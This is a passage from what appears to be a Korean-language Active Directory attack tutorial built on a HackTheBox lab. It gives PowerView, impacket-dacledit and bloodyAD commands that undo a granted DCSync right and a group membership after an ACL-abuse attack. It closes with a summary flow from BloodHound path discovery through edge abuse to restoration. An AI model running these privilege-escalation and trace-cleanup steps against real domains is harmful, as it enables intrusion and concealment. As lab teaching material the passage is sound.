## 공격 후 정리 (Cleanup)

ACL 변경은 영구적으로 남기 때문에 흔적 제거가 중요하다. Event ID 5136으로 변경이 기록되지만 제거도 동일하게 기록되므로, 제거 여부가 감사 로그에 남는다.

```powershell
# 그룹에서 유저 제거
Remove-DomainGroupMember `
  -Identity 'Exchange Windows Permissions' `
  -Members svc_alfresco `
  -Verbose

# 부여한 ACL 제거
# Remove-DomainObjectAcl: 추가한 ACE를 제거하는 PowerView 함수
Remove-DomainObjectAcl `
  -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity svc_alfresco `
  -Rights DCSync `
  -Verbose
```

```bash
# Linux — impacket-dacledit으로 ACL 제거
# -action remove: ACE 제거 모드
impacket-dacledit corp.local/svc_alfresco:'Password' \
  -dc-ip <DC_IP> \
  -action remove \
  -rights DCSync \
  -principal svc_alfresco \
  -target-dn "DC=htb,DC=local"

# bloodyAD로 그룹 멤버 제거
# remove groupMember: 그룹에서 멤버를 제거하는 명령
bloodyAD --host <DC_IP> -d htb.local -u svc_alfresco -p 'Password' \
  remove groupMember 'Exchange Windows Permissions' svc_alfresco
```

---

## 흐름

BloodHound로 ACL 경로 발견 → 엣지 타입 확인 (GenericAll/WriteDACL 등) → 해당 엣지 악용 → PowerView(Windows) 또는 dacledit / bloodyAD(Linux)로 실행 → 목적 달성 후 원래 상태로 복구